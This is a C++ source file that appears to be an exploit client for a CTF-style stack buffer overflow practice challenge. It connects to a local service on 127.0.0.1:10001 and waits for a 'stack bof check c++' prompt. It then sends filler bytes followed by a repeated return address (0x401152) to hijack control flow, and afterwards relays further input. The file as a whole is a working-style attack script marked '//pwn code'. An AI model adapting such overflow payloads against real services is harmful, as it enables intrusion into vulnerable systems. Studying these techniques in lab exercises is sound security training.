#include "tcp_class.h"
#include "payload.h"
#include <iostream>
#include <cstring>
int init_(void){
  setvbuf(stdout,NULL,_IONBF,1);
  setvbuf(stdin,NULL,_IONBF,1);
  return 0;
}


int main(void){
  init_();
  char buf[21];
  Client_sock sock;
  payload payl;
  payload recv;
  sock.MakeSocket();
  sock.SetOpt("127.0.0.1",10001);
  sock.Connect();
  //pwn code
  for(uint32_t i=0;i<4;i++){
    payl.p64((uint64_t)0xdeadbeefcafebabe,false);
  }
  for(uint32_t i=0;i<6;i++){
    payl.p64((uint64_t)0x401152 ,false);
  }
  payl<<"\n";
  payl.print_all();
  payl.print_buf();
//  sock.Send(&payl);
  
  sock.RecvUntil(&recv,"stack bof check c++\n");
  std::cout << recv.buf()<<std::endl;
  sock.Send(&payl);

  sock.RecvUntil(&recv,"pwned?\n");
  std::cout<< (const char*)recv.buf()<<std::endl;
  std::cin>>buf;
  payl.clear();payl.make_buffer();payl<<buf;


  recv.clear();
  recv.make_buffer();
  recv<<(const char*)buf;
  recv<<"\n\n";
  sock.Send(&recv);
  std::cout<<"AAAAAAAAA";
  sock.RecvUntil(&recv,"!\n");
  std::cout<<(const char*)recv.buf()<<std::endl;
  recv.print_buf();

  payl.clear();payl.make_buffer();payl<<buf;
  sock.Send(&payl);
  sock.Recv(&recv,50);
  std::cout<<(const char*)recv.buf()<<std::endl;
  return 0;
}
